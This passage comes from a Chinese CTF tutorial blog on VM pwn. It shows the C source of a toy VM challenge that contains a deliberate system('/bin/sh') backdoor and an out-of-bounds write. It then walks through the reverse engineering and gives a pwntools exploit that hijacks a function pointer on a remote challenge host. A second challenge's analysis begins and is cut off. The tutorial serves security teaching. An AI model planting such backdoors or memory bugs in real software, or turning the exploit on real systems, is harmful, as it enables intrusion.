class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> memory[<span class="number">65536</span>];</span><br><span class="line"><span class="type">int</span> reg[<span class="number">12</span>];</span><br><span class="line"><span class="type">int</span> <span class="built_in">stack</span>[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">void</span> (*funcptr)();</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span>  <span class="title function_">fetch</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">execute</span><span class="params">(<span class="type">int</span> code)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">my_print</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">my_print</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;over!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fetch</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> a1;</span><br><span class="line">        a1 = reg[<span class="number">11</span>];</span><br><span class="line">        reg[<span class="number">11</span>] += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute</span><span class="params">(<span class="type">int</span> code)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> cmd;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> r1;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> r2;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> r3;</span><br><span class="line">        cmd = (code &amp; <span class="number">0xff000000</span>)&gt;&gt; <span class="number">24</span>;</span><br><span class="line">        r1  = (code &amp; <span class="number">0xf0000</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">        r2  = (code &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">        r3  = (code &amp; <span class="number">0xf</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (r1 &gt; <span class="number">11</span> || r2 &gt; <span class="number">11</span> || r3 &gt; <span class="number">11</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;out of index&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(cmd)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x10</span>:</span><br><span class="line">                        reg[r1] = (code&amp;&amp;<span class="number">0xffff</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x20</span>:</span><br><span class="line">                        <span class="built_in">stack</span>[reg[<span class="number">10</span>]] = reg[r1];</span><br><span class="line">                        reg[<span class="number">10</span>]+=<span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x30</span>:</span><br><span class="line">                        reg[<span class="number">10</span>]-=<span class="number">1</span>;</span><br><span class="line">                        reg[r1] = <span class="built_in">stack</span>[reg[<span class="number">10</span>]];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x40</span>:</span><br><span class="line">                        reg[r1] = reg[r2] + reg[r3];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x50</span>:</span><br><span class="line">                        reg[r1] = reg[r2] - reg[r3];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x60</span>:</span><br><span class="line">                        reg[r1] = reg[r2] ^ reg[r3];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x70</span>:</span><br><span class="line">                        reg[r1] = reg[r2] &gt;&gt; reg[r3];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x80</span>:</span><br><span class="line">                        reg[r1] = reg[r2] &lt;&lt; reg[r3];</span><br><span class="line">                 <span class="keyword">case</span> <span class="number">0x90</span>:</span><br><span class="line">                        memory[reg[r1]] = reg[r2];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">short</span> <span class="type">unsigned</span> <span class="type">int</span> ip;</span><br><span class="line">        <span class="type">short</span> <span class="type">unsigned</span> <span class="type">int</span> sp;</span><br><span class="line">        <span class="type">short</span> <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">        <span class="type">short</span> <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">        <span class="type">int</span> code;</span><br><span class="line">        funcptr = my_print;</span><br><span class="line">        init();</span><br><span class="line"></span><br><span class="line">        write(<span class="number">1</span>,<span class="string">&quot;This is my vm.\n&quot;</span>,<span class="number">15</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;set your IP:&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%hd&quot;</span>,&amp;ip);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;set your SP:&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%hd&quot;</span>,&amp;sp);</span><br><span class="line">        getchar();</span><br><span class="line">        reg[<span class="number">10</span>] = sp;</span><br><span class="line">        reg[<span class="number">11</span>] = ip;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( ip &gt; <span class="number">0x2000</span> || !sp)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;How much code do you want to execve:&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%hd&quot;</span>,&amp;size);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">for</span>( count=<span class="number">0</span>; count &lt; size; count++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;memory[count]);</span><br><span class="line">                getchar();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>( count=<span class="number">0</span>; count &lt; size; count++)</span><br><span class="line">        &#123;</span><br><span class="line">                code = fetch();</span><br><span class="line">                execute(code);</span><br><span class="line">        &#125;</span><br><span class="line">        funcptr();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;                                                                                                 </span><br></pre></td></tr></table></figure><h2 id="level_1分析1"><a href="#level-1分析1" class="headerlink" title="level_1分析1"></a>level_1分析1</h2><ul><li>按照流程我们先来<code>check</code>一下保护机制。发现并没有开启<code>PIE</code>保护</li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250310084657045.png" alt="image-20250310084657045"></p><ul><li><p>现在我们来反编译这个程序，查看一下这个程序的具体运行逻辑</p></li><li><p>我们先来查看<code>main</code>函数，我们按顺序分析这个程序</p><ul><li>首先会<code>funcptr</code>是一个函数指针，它指向了<code>my_print</code>这个函数，并且使用<code>init</code>对输入输出进行初始化</li><li>然后程序会让用户输入<code>SP</code>和<code>IP</code>，并且将用户输入的值放入<code>sp</code>和<code>ip</code>寄存器中。并检查用户输入的初始化值是否合法</li><li>之后程序会让用户输入程序要执行的指令数。然后进入循环，执行两个函数</li><li>最后调用<code>funcptr</code>这个函数指针指向的函数</li></ul></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250310164804658.png" alt="image-20250310164804658"></p><ul><li>接下来我们查看一下<code>fetch()</code>这个函数，发现就是一个取<code>memory[ip]</code>的值，并且将<code>ip</code>自增，然后返回取出来的值</li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250310165549267.png" alt="image-20250310165549267"></p><ul><li>接下来查看一下<code>execute()</code>这个函数，这个函数会将前面取出来的<code>memory[ip]</code>指令作为参数传递</li><li>这里我们一开始并不知道<code>HIBYTE(a1)</code>的值，此时我们就要查看汇编理解一下，我们先看到<code>v5</code>存储在<code>rbp-8</code>这个栈地址中</li><li>通过汇编我们可以看到<code>v5</code>存储的是<code>a1</code>的最高<code>8</code>位，之后通过伪c代码就可以看到<ul><li><code>v2</code>存储的值是<code>a1</code>的第<code>17-20</code>位</li><li><code>v3</code>存储的值是<code>a1</code>的第<code>9-12</code>位</li><li><code>v4</code>存储的值是<code>a1</code>的第<code>1-4</code>位</li></ul></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250310165818475.png" alt="image-20250310165818475"></p><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250310170324721.png" alt="image-20250310170324721"></p><ul><li>我们接下去查看，我们会发现当<code>v5</code>即（<code>a1</code>的最高<code>8</code>位为特定的值时，会执行特定的类似于汇编指令）就像图中<ul><li><code>v5=0x50</code>，则会执行<code>reg[v2]=reg[v3]-reg[v4]</code>,也就是执行<code>sub</code>指令</li><li><code>v5=0x70</code>，则会执行<code>reg[v2]=reg[v3]&gt;&gt;reg[v4]</code>，也就执行<code>shr</code>指令</li><li>这时我们就可以知道，变量<code>v2</code>、<code>v3</code>、<code>v4</code>就代表着寄存器的编号。</li></ul></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250310170704072.png" alt="image-20250310170704072"></p><ul><li>这时我们通过逆向，可以归纳出剩下的指令，而该函数模拟的指令如下，这时我们还注意到<code>reg</code>这个数组是<code>int</code>类型，而不是<code>unsigned</code>类型</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x10</span>  reg[v2] = imm;      mov imm</span><br><span class="line"><span class="number">0x20</span>  push reg[v2];  push</span><br><span class="line"><span class="number">0x30</span>  pop reg[v2] pop</span><br><span class="line"><span class="number">0x40</span>  reg[v2] = reg[v3] + reg[v4];  add</span><br><span class="line"><span class="number">0x50</span>  reg[v2] = reg[v3] - reg[v4];  sub</span><br><span class="line"><span class="number">0x60</span>  reg[v2] = reg[v3] ^ reg[v4];xor</span><br><span class="line"><span class="number">0x70</span>  reg[v2] = reg[v3] &gt;&gt; reg[v4];shr</span><br><span class="line"><span class="number">0x80</span>  reg[v2] = reg[v3] &lt;&lt; reg[v4];shl</span><br><span class="line"><span class="number">0x90</span>  memory[reg[v2]] = reg[v3];mov [reg[v2]],reg[v3]</span><br></pre></td></tr></table></figure><ul><li>我们在函数这块还注意到有一个<code>后门函数</code></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250310172420018.png" alt="image-20250310172420018"></p><ul><li>我们现在来查看一下<code>.bss</code>段的全局变量，这时我们发现<code>funcptr</code>就在<code>memory</code>相邻低地址处</li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250310172233421.png" alt="image-20250310172233421"></p><ul><li>我们还注意到有<code>reg</code>这个数组</li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250310172727594.png" alt="image-20250310172727594"></p><ul><li>还注意到<code>stack</code></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250310172747886.png" alt="image-20250310172747886"></p><h2 id="level_1分析2"><a href="#level-1分析2" class="headerlink" title="level_1分析2"></a>level_1分析2</h2><ul><li>这时我们可以确定漏洞点，就是利用<code>memory[reg[v2]]</code>这个指令进行负索引，从而修改<code>funcptr</code>这个指针为<code>backdoor()</code>这个函数的地址。</li><li><p>接下来我们就来构造一个负索引，我们先初始化<code>sp=0</code>、<code>ip=0x1000</code></p></li><li><p>首先我们需要构造寄存器的值为负值。一开始我们的各个寄存器都为<code>0</code>,我们先通过<code>mov imm</code>操作，将这个寄存器<code>0、1、2</code>赋值为<code>8、4、20</code></p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">reg[<span class="number">0</span>]=<span class="number">8</span></span><br><span class="line">reg[<span class="number">1</span>]=<span class="number">4</span></span><br><span class="line">reg[<span class="number">2</span>]=<span class="number">20</span></span><br><span class="line">reg[<span class="number">3</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">4</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">5</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">6</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">7</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">8</span>]=<span class="number">0</span></span><br><span class="line">reg[<span class="number">9</span>]=<span class="number">0</span></span><br><span class="line">sp=<span class="number">0</span></span><br><span class="line">ip=<span class="number">0x100</span></span><br></pre></td></tr></table></figure><ul><li>之后我们通过<code>0x80</code>左移操作，将寄存器<code>r1</code>设置为<code>0x400000</code>，即：<code>r1=r1 &lt;&lt; r2</code>（<code>r1 =  4 &lt;&lt; 20</code>）</li><li>然后通过<code>0x10</code>这个操作将<code>0x877</code>赋值给<code>r3</code></li><li>最后通过<code>0x40</code>这个操作（<code>add</code>）将<code>r1</code>的值变为<code>0x400877</code>，这就是<code>backdoor</code>的地址，这一步操作就是为越界读写修改函数指针做准备</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">reg[0]=8</span><br><span class="line">reg[1]=0x400877</span><br><span class="line">reg[2]=20</span><br><span class="line">reg[3]=0x877</span><br><span class="line">reg[4]=0</span><br><span class="line">reg[5]=0</span><br><span class="line">reg[6]=0</span><br><span class="line">reg[7]=0</span><br><span class="line">reg[8]=0</span><br><span class="line">reg[9]=0</span><br><span class="line">sp=0</span><br><span class="line">ip=0x100</span><br></pre></td></tr></table></figure><ul><li>之后我们要构造负索引，这时我们就用<code>0x50</code>，<code>sub</code>指令，使<code>r4-r0</code>，这时我们就得到了负值。</li><li><p>最后我们再通过<code>0x90</code>存指令，直接就可以实现越界读写，使得<code>函数指针指向backdoor</code></p></li><li><p>至于负索引要索引到多少，就需要动调去计算偏移了。</p></li></ul><h2 id="level_1_exp"><a href="#level-1-exp" class="headerlink" title="level_1_exp"></a>level_1_exp</h2><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">p = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="number">28151</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./my_vm&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>(<span class="params">op,r1,r2,r3=<span class="number">0</span></span>):</span><br><span class="line">    a = (op &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span></span><br><span class="line">    a +=(r1 &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">    a +=(r2 &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">8</span></span><br><span class="line">    a +=(r3 &amp; <span class="number">0xFF</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(a))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(a).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 设置PC=0x1000</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;IP:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x0</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 设置SP=0x0</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;SP:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 设置Code_size=0x1000</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;execve:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x8</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;break *0x400CFB&#x27;)</span></span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">20</span>)</span><br><span class="line">code(<span class="number">0x80</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>) <span class="comment"># r1 = 0x400000</span></span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">3</span>,<span class="number">0x08</span>,<span class="number">0x77</span>)</span><br><span class="line">code(<span class="number">0x40</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line">code(<span class="number">0x50</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">code(<span class="number">0x90</span>,<span class="number">4</span>,<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="vm_pwn_level_2"><a href="#VM-PWN-level-2" class="headerlink" title="VM_PWN_level_2"></a>VM_PWN_level_2</h1><ul><li>由于没有什么新知识点，那么就直接来看题，动手做一题就知道<code>vm_pwn</code>的具体是怎么做的了，并且也不用害怕不理解新知识。</li><li>接下来就以：buuctf上的<code>[OGeek2019 Final]OVM</code>作为例题来入门。</li></ul><h2 id="level_2分析1"><a href="#level-2分析1" class="headerlink" title="level_2分析1"></a>level_2分析1</h2><ul><li>我们拿到附件后就先来<code>check</code>一下程序的保护机制。发现程序开启了如下保护机制。</li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228194508857.png" alt="image-20250228194508857"></p><ul><li>然后我们使用<code>IDA</code>对这个程序进行反汇编并且逆向出这个程序的运行逻辑。先查看<code>main</code>函数的执行流程，同时先运行一下这个程序，由于<code>main</code>函数比较长，我们根据输入点，分段逆向。<ul><li>首先程序会先申请一个堆块，然后输入输出初始化，之后会出现一个<code>signal</code>函数。<code>signal</code>函数这里就先不管他</li><li>之后就会输出<code>WELCOME TO OVM PWN\n PC</code>这个字符串</li><li>输出之后就会让用户输入一个<code>short int</code>类型的数据。之后会处理用户输入的<code>\n</code></li><li><strong>此时我们还不知道PC是什么作用</strong></li></ul></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228195033818.png" alt="image-20250228195033818"></p><ul><li>按照要求输入之后就会执行如下程序：<ul><li>程序会输出<code>SP:</code>，然后要求用户再次输入一个<code>short int</code>类型的数据，并处理用户输入的<code>\n</code></li><li>之后会将我们之前输入的<code>PC</code>值给<code>reg[15]</code>，会将<code>SP</code>的值给<code>reg[13]</code>，（这里<code>reg</code>是一个拥有16个元素的数组，每个元素的数组大小为<code>4</code>字节）</li><li>这下我们知道<code>PC</code>的值就是程序执行的地址，而<code>SP</code>的值是栈顶指针。</li><li><strong>这两个输入的作用就是让用户指定PC和SP的值</strong></li><li>所以我们就在<code>IDA</code>中加上注释，防止我们后续忘记。</li></ul></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228195845007.png" alt="image-20250228195845007"></p><ul><li>继续接下去看代码：<ul><li>程序先会输出<code>CODE SIZE</code>，然后再让用户输出一个<code>short int</code>类型的数据，并处理用户输入的<code>\n</code></li><li>之后程序会检查我们之前输入的<code>SP</code>指针的值和<code>CODE SIZE</code>两者的和是否会大于<code>0x1000</code>并且检查<code>CODE SIZE</code>是否为<code>0</code></li><li>如果大于<code>0x1000</code>或者<code>CODE SIZE</code>为<code>0</code>，程序就会退出。</li></ul></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228200507026.png" alt="image-20250228200507026"></p><ul><li>接下去逆向：<ul><li>之后程序会输出<code>CODE</code>字符串，并且设置<code>running</code>这个全局变量为<code>1</code>。</li><li>之后会让用户循环输入<code>int</code>类型的数据，循环的次数为我们之前输入的<code>CODE SIZE</code>。</li><li>所以<code>CODE SIZE</code>的值就是我们之后要输入的操作数个数。</li><li>这里<code>memory</code>也是一个全局变量，它是一个<code>65536</code>长度的数组，数组里面每个元素的长度为4字节。</li><li>并且我们<code>memory</code>中的什么位置的索引开始，这与我们之前输入的<code>PC</code>有关。并且用户每次输入程序都会处理程序输入的<code>\n</code></li><li>注意：<strong>在用户输入后还会对用户输入的值做一个检查，即用户输入的int类型不能以0xff开头</strong></li></ul></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228200847942.png" alt="image-20250228200847942"></p><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228203033265.png" alt="image-20250228203033265"></p><ul><li>查看最后剩下的代码：<ul><li>程序会通过<code>while</code>循环，先调用<code>fetch()</code>函数，将返回值给<code>v7</code>，之后调用<code>execute()</code>这个函数，并且把<code>v7</code>这个参数传入到<code>execute()</code>函数中。</li><li>之后用户会向<code>comment</code>写入<code>0x8c</code>长度的内容，程序会调用<code>sendcomment()</code>函数，并且将<code>comment</code>作为参数传递进去</li><li>最后程序会输出<code>Bye\n</code>然后结束运行。</li></ul></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228201936035.png" alt="image-20250228201936035"></p><ul><li><p>分析完<code>main</code>函数，我们接下来就分析其他自定义的函数，主要还有<code>fetch()</code>、<code>execute()</code>、<code>sendcomment()</code>这三个函数。</p></li><li><p>接下来我们分析<code>fetch()</code>函数：</p><ul><li><code>fetch()</code>函数很短，就是将执行<code>PC=PC+1</code>这个操作</li><li>并且返回的是<code>CODE</code>的值，即下一个要执行的操作码</li></ul></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228203307221.png" alt="image-20250228203307221"></p><ul><li>再来分析<code>execute()</code>这个函数，这个函数的内容就非常多，所以还是需要一步一步来进行逆向，这边有很多个<code>if</code>分支，我们先来逐个分析：<ul><li>程序定义了<code>v2</code>、<code>v3</code>、<code>v4</code>三个<code>unsigned char</code>类型的变量和<code>i</code>这一个int类型的变量</li><li>而<code>v4</code>存储的是<code>a1</code>即<code>CODE</code>的<code>17-20</code>位</li><li><code>v3</code>存储的是<code>CODE</code>的<code>9-12</code>位</li><li><code>v2</code>存储的是<code>CODE</code>的最低<code>4</code>位，</li><li>而<code>HIBYTE(a1)</code>就是取<code>a1</code>的最高<code>8</code>位(这个需要从汇编来理解)。存入<code>rax</code>中的最低8位，并且将<code>rax</code>的高位填充为<code>0</code>，所以指令被存储在最高<code>a1</code>的最高8位中</li><li>当<code>a1</code>的<code>25-32</code>位的值为<code>0x70</code>时，就会执行if语句，也就是将执行<code>add</code>操作，<code>add r1,r2,r3 &lt;=&gt; r1=r2+r3</code>，并返回。</li><li>并且我们可以确定在三寄存器运算中<code>v4</code>代表<code>目的寄存器的编号</code>，<code>v2</code>、<code>v3</code>都表示源寄存器的编号</li></ul></li></ul><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228210114684.png" alt="image-20250228210114684"></p><p><img src="/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/image-20250228210640842.png" 